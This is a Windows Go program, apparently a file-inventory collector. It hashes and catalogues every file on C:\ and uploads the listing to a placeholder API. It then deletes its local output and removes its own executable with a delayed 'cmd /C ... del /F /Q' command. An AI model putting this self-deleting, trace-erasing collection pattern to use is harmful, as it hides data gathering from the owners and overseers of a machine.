//go:build windows
// +build windows

package main

import (
	"archive/zip"
	"bytes"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"mime/multipart"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"
	"unsafe"
)

// FileInfo represents file information
type FileInfo struct {
	Name       string `json:"name"`
	Size       int64  `json:"size"`
	Type       string `json:"type"`
	Path       string `json:"path"`
	SHA256     string `json:"sha256"`
	Created    string `json:"created"`
	Modified   string `json:"modified"`
	Accessed   string `json:"accessed"`
	Systemname string `json:"systemname"`
	Source     string `json:"source"`
}

// getSHA256 calculates the SHA256 hash of a file
func getSHA256(path string) (string, error) {
	file, err := os.Open(path)
	if err != nil {
		return "", err
	}
	defer file.Close()

	hash := sha256.New()
	if _, err := io.Copy(hash, file); err != nil {
		return "", err
	}
	return hex.EncodeToString(hash.Sum(nil)), nil
}

// getFileTimestamps returns the created, modified, and accessed timestamps of a file
func getFileTimestamps(path string) (created, modified, accessed string, err error) {
	file, err := os.Open(path)
	if err != nil {
		return "", "", "", err
	}
	defer file.Close()

	var winFileData syscall.Win32FileAttributeData
	err = syscall.GetFileAttributesEx(syscall.StringToUTF16Ptr(path), syscall.GetFileExInfoStandard, (*byte)(unsafe.Pointer(&winFileData)))
	if err != nil {
		return "", "", "", err
	}

	created = time.Unix(0, winFileData.CreationTime.Nanoseconds()).UTC().Format(time.RFC3339)
	modified = time.Unix(0, winFileData.LastWriteTime.Nanoseconds()).UTC().Format(time.RFC3339)
	accessed = time.Unix(0, winFileData.LastAccessTime.Nanoseconds()).UTC().Format(time.RFC3339)

	return created, modified, accessed, nil
}

// processFile processes a single file and returns its FileInfo
func processFile(path string, logger *log.Logger) (*FileInfo, error) {
	fileInfo, err := os.Stat(path)
	if err != nil {
		logger.Printf("[%s] [ERROR] Error accessing path %s: %v\n", time.Now().UTC().Format(time.RFC3339), path, err)
		return nil, err
	}

	created, modified, accessed, err := getFileTimestamps(path)
	if err != nil {
		logger.Printf("[%s] [ERROR] Error getting file times for %s: %v\n", time.Now().UTC().Format(time.RFC3339), path, err)
		return nil, err
	}

	sha256Sum, err := getSHA256(path)
	if err != nil {
		logger.Printf("[%s] [ERROR] Error calculating hash for %s: %v\n", time.Now().UTC().Format(time.RFC3339), path, err)
		return nil, err
	}

	return &FileInfo{
		Name:     fileInfo.Name(),
		Size:     fileInfo.Size(),
		Type:     strings.ToUpper(filepath.Ext(path)),
		Path:     path,
		SHA256:   sha256Sum,
		Created:  created,
		Modified: modified,
		Accessed: accessed,
	}, nil
}

// addFileToZip adds a file to a ZIP archive.
func addFileToZip(zipWriter *zip.Writer, filename string) error {
	fileToZip, err := os.Open(filename)
	if err != nil {
		return err
	}
	defer fileToZip.Close()

	info, err := fileToZip.Stat()
	if err != nil {
		return err
	}

	header, err := zip.FileInfoHeader(info)
	if err != nil {
		return err
	}

	header.Name = filepath.Base(filename)
	header.Method = zip.Deflate

	writer, err := zipWriter.CreateHeader(header)
	if err != nil {
		return err
	}

	_, err = io.Copy(writer, fileToZip)
	return err
}

// worker function to process files from the queue
func worker(fileQueue <-chan string, results chan<- *FileInfo, logger *log.Logger, wg *sync.WaitGroup, jsonlFileName string) {
	for path := range fileQueue {
		fileInfo, err := processFile(path, logger)
		if err == nil && fileInfo != nil {
			fileInfo.Source = jsonlFileName
			results <- fileInfo
		}
		wg.Done()
	}
}

func main() {
	startTime := time.Now().UTC()
	startTimeStr := startTime.Format(time.RFC3339)
	startTimeStrFile := strings.ReplaceAll(startTimeStr, ":", "_")

	hostname, err := os.Hostname()
	if err != nil {
		log.Fatal("Could not get hostname:", err)
	}

	logFileName := fmt.Sprintf("winlist_%s_%s.log", hostname, startTimeStrFile)
	logFile, err := os.OpenFile(logFileName, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0666)
	if err != nil {
		log.Fatal("Could not create log file:", err)
	}
	defer logFile.Close()

	logger := log.New(logFile, "", 0)

	jsonlFileName := fmt.Sprintf("winlist_%s_%s.jsonl", hostname, startTimeStrFile)
	jsonlFile, err := os.Create(jsonlFileName)
	if err != nil {
		logger.Printf("[%s] [ERROR] Could not create jsonl file: %v\n", time.Now().UTC().Format(time.RFC3339), err)
	}
	defer jsonlFile.Close()

	var fileQueue = make(chan string, 100)
	var results = make(chan *FileInfo, 100)
	var wg sync.WaitGroup
	var mutex sync.Mutex
	var lineCount int

	numWorkers := runtime.NumCPU()
	for i := 0; i < numWorkers; i++ {
		go worker(fileQueue, results, logger, &wg, jsonlFileName)
	}

	go func() {
		for result := range results {
			result.Systemname = hostname
			jsonData, err := json.Marshal(result)
			if err != nil {
				logger.Printf("[%s] [ERROR] Error marshalling json for %s: %v\n", time.Now().UTC().Format(time.RFC3339), result.Path, err)
			}

			mutex.Lock()
			_, err = jsonlFile.Write(jsonData)
			if err != nil {
				logger.Printf("[%s] [ERROR] Error writing to jsonl file: %v\n", time.Now().UTC().Format(time.RFC3339), err)
			}

			_, err = jsonlFile.Write([]byte("\n"))
			if err != nil {
				logger.Printf("[%s] [ERROR] Error writing to jsonl file: %v\n", time.Now().UTC().Format(time.RFC3339), err)
			}
			lineCount++
			mutex.Unlock()
		}
	}()

	err = filepath.Walk(`C:\`, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			logger.Printf("[%s] [ERROR] Error accessing path %s: %v\n", time.Now().UTC().Format(time.RFC3339), path, err)
			return nil
		}

		if !info.IsDir() {
			wg.Add(1)
			fileQueue <- path
		}
		return nil
	})
	if err != nil {
		logger.Printf("[%s] [ERROR] Error walking the path: %v\n", time.Now().UTC().Format(time.RFC3339), err)
	}

	wg.Wait()
	close(fileQueue)
	close(results)

	stopTime := time.Now().UTC()
	totalDuration := stopTime.Sub(startTime)
	logger.Printf("[%s] [INFO] Program started at: %s\n", stopTime.Format(time.RFC3339), startTimeStr)
	logger.Printf("[%s] [INFO] Program stopped at: %s\n", stopTime.Format(time.RFC3339), stopTime.Format(time.RFC3339))
	logger.Printf("[%s] [INFO] Total run time: %s\n", stopTime.Format(time.RFC3339), totalDuration)
	logger.Printf("[%s] [INFO] Total JSON lines: %d\n", stopTime.Format(time.RFC3339), lineCount)

	zipFileName := fmt.Sprintf("winlist_%s_%s.zip", hostname, startTimeStrFile)
	zipFile, err := os.Create(zipFileName)
	if err != nil {
		log.Fatal("Could not create zip file:", err)
	}

	zipWriter := zip.NewWriter(zipFile)
	defer func() {
		err1 := zipWriter.Close()
		if err1 != nil {
			log.Fatal("Could not close zip writer:", err1)
		}

		err2 := zipFile.Close()
		if err2 != nil {
			log.Fatal("Could not close zip file:", err2)
		}
	}()

	err = addFileToZip(zipWriter, logFileName)
	if err != nil {
		log.Fatal("Could not add log file to zip:", err)
	}

	err = addFileToZip(zipWriter, jsonlFileName)
	if err != nil {
		log.Fatal("Could not add jsonl file to zip:", err)
	}

	// Upload JSONL file to API
	err = uploadToAPI(jsonlFileName, logger)
	if err != nil {
		logger.Printf("[%s] [ERROR] Failed to upload JSONL file to API: %v\n", time.Now().UTC().Format(time.RFC3339), err)
	} else {
		// Delete local files after successful upload
		os.Remove(zipFileName)
		os.Remove(jsonlFileName)
		os.Remove(logFileName)
		logger.Printf("[%s] [INFO] Local files deleted after successful upload\n", time.Now().UTC().Format(time.RFC3339))
	}

	// Self-delete after completing main operations
	if err := selfDelete(); err != nil {
		logger.Printf("[%s] [ERROR] Failed to initiate self-deletion: %v\n", time.Now().UTC().Format(time.RFC3339), err)
	}
}

func uploadToAPI(jsonlFile string, logger *log.Logger) error {
	// API details
	apiURL := "https://your-api-url.com/upload"
	apiKey := "your-api-key"

	// Prepare the multipart form data
	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)

	// Add jsonl file to the form
	jsonlFileWriter, err := writer.CreateFormFile("jsonl_file", filepath.Base(jsonlFile))
	if err != nil {
		return fmt.Errorf("error creating form file for jsonl: %v", err)
	}
	jsonlFileContent, err := os.ReadFile(jsonlFile)
	if err != nil {
		return fmt.Errorf("error reading jsonl file: %v", err)
	}
	_, err = jsonlFileWriter.Write(jsonlFileContent)
	if err != nil {
		return fmt.Errorf("error writing jsonl file to form: %v", err)
	}

	// Close the multipart writer
	err = writer.Close()
	if err != nil {
		return fmt.Errorf("error closing multipart writer: %v", err)
	}

	// Create the request
	req, err := http.NewRequest("POST", apiURL, body)
	if err != nil {
		return fmt.Errorf("error creating request: %v", err)
	}

	// Set headers
	req.Header.Set("Content-Type", writer.FormDataContentType())
	req.Header.Set("Authorization", "Bearer "+apiKey)

	// Send the request
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("error sending request: %v", err)
	}
	defer resp.Body.Close()

	// Check the response
	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("API request failed with status code: %d", resp.StatusCode)
	}

	logger.Printf("[%s] [INFO] JSONL file successfully uploaded to API\n", time.Now().UTC().Format(time.RFC3339))
	return nil
}

// selfDelete initiates deletion of the executable after a delay
func selfDelete() error {
	exe, err := os.Executable()
	if err != nil {
		return fmt.Errorf("could not get executable path: %v", err)
	}

	cmd := exec.Command("cmd", "/C", "ping 127.0.0.1 -n 2 > nul && del /F /Q "+exe)
	cmd.SysProcAttr = &syscall.SysProcAttr{CreationFlags: syscall.CREATE_NEW_PROCESS_GROUP}
	return cmd.Start()
}
